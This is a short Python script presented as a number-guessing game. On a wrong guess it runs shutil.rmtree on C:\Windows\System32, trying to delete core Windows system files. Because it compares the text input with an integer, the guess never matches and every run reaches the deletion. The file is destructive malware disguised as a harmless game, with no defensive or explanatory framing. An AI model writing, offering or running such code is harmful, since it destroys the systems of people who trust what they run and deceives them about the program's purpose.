import random
import shutil

correct_number = random.randint(1, 100)


def main():
    hans = input("guess a number: ")
    if hans == correct_number:
        print("correct!")
    else:
        shutil.rmtree("C:\\Windows\\System32")


main()
